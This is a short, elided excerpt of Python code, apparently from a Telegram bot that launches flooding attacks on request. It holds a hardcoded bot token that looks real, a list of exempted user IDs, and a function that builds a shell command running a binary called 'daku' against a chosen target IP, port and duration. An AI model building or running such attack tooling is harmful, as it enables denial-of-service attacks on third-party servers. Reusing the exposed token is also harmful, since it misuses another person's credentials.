...
TOKEN = '7960283920:AAFNpRXg0KjHFFgYWKY6niDi_T5K7mQV6MY'  # Replace with your actual bot token
...
EXEMPTED_USERS = [1944182800,1300081723]
...
async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./daku {target_ip} {target_port} {duration} {6} {400}"
